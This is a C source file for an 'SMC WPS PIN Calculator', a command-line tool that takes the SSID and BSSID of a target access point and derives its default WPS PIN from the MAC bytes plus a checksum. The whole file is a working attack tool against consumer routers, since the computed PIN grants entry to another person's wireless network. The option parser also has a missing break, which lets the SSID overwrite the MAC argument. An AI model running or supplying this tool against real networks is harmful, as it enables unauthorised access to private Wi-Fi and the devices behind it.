#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <stdint.h>

#define BOLD \033[1m
#define B_RED \033[1;31m
#define B_LGRAY \033[1;37m
#define H_GREEN \033[1;42m
#define H_RED	\033[1;41m
#define C_RESET \033[0m

unsigned int wps_pin_checksum(unsigned int pin);
unsigned int wps_pin_valid(unsigned int pin);
unsigned int hex_string_to_byte_array(char *in, uint8_t *out,
		const unsigned int n_len);
void display_usage(void);

struct globalArgs_t {
	char *ssid;
	char *mac;
} globalArgs;

static const char *optString = "s:m:h?";

static const struct option longOpts[] = {
		{ "ssid", required_argument, NULL, 's' }, { "mac", required_argument,
				NULL, 'm' }, { "help", no_argument, NULL, 'h' }, { NULL,
				no_argument, NULL, 0 } };

int main(int argc, char *argv[]) {
	int opt = 0;
	int longIndex = 0;
	char ssid[33];
	uint8_t mac[6];
	int f_def;
	unsigned int c[2];

	globalArgs.mac = NULL;
	opt = getopt_long(argc, argv, optString, longOpts, &longIndex);
	while (opt != -1) {
		switch (opt) {
		case 's':
			globalArgs.ssid = optarg;
		case 'm':
			globalArgs.mac = optarg;
			break;
		case 'h':
		case '?':
			display_usage();
			break;
		default:
			printf("ERROR! Option(s) not concerned!");
			exit(EXIT_FAILURE);
		}
		opt = getopt_long(argc, argv, optString, longOpts, &longIndex);
	}

	if (globalArgs.ssid == 0 && globalArgs.mac == 0) {
		printf("\n SMC WPS PIN Calculator\n\n");
		printf(" Required Arguments:\n");
		printf("      -s, --ssid=<ssid>         SSID of the target AP\n");
		printf("      -m, --mac=<mac>           BSSID of the target AP\n\n");
		printf("      Usage: smcwps -s HOME-ABCD -m 001122334455\n\n");
		exit(1);
	}

	printf("\n\n SSID: \033[1;92m%s\033[0m\n", globalArgs.ssid);
	printf(" BSSID: \033[1;92m%s\033[0m\n\n", globalArgs.mac);

	if (hex_string_to_byte_array(globalArgs.mac, mac, 6)) {
		printf("\nInvalid MAC address\n");
		exit(1);
	}
	if (!sscanf(globalArgs.ssid, "HOME-%02x%02x", &c[0], &c[1])) {
		printf("\nInvalid SSID\n");
		exit(1);
	}

	mac[4] = (uint8_t) c[0];
	mac[5] = (uint8_t) c[1];

	unsigned int result = ((uint64_t) mac[3] << 16) | ((uint64_t) mac[4] << 8)
			| ((uint64_t) mac[5]);
	if (result > 9999999) {
		unsigned int off = result / 10000000;
		result = result - off * 10000000;
		f_def = 1;
	}

	unsigned int pin_cs = wps_pin_checksum(result);
	result = result * 10 + pin_cs;
	printf("\n\n > WPS PIN: \033[1;96m%08u\033[0m\n\n", result);

	return 0;
}

unsigned int wps_pin_checksum(unsigned int pin) {
	unsigned int accum = 0;
	while (pin) {
		accum += 3 * (pin % 10);
		pin /= 10;
		accum += pin % 10;
		pin /= 10;
	}

	return (10 - accum % 10) % 10;
}

unsigned int wps_pin_valid(unsigned int pin) {
	return wps_pin_checksum(pin / 10) == (pin % 10);
}

void display_usage(void) {
	printf("\n SMC WPS PIN Calculator\n\n");
	printf(" Required Arguments:\n");
	printf("      -s, --ssid=<ssid>         SSID of the target AP\n");
	printf("      -m, --mac=<mac>           BSSID of the target AP\n\n");
	printf("      Usage: smcwps -s HOME-ABCD -m 001122334455\n\n");
	exit(EXIT_FAILURE);
}

unsigned int hex_string_to_byte_array(char *in, uint8_t *out,
		const unsigned int n_len) {
	uint_fast8_t o;
	unsigned int len = strlen(in);
	unsigned int b_len = n_len * 2 + n_len - 1;

	if (len != n_len * 2 && len != b_len)
		return 1;
	for (unsigned int i = 0; i < n_len; i++) {
		o = 0;
		for (uint_fast8_t j = 0; j < 2; j++) {
			o <<= 4;
			if (*in >= 'A' && *in <= 'F')
				*in += 'a' - 'A';
			if (*in >= '0' && *in <= '9')
				o += *in - '0';
			else if (*in >= 'a' && *in <= 'f')
				o += *in - 'a' + 10;
			else
				return 1;
			in++;
		};
		*out++ = o;
		if (len == b_len) {
			if (*in == ':' || *in == '-' || *in == ' ' || *in == 0)
				in++;
			else
				return 1;
		}
	}
	return 0;
}
;
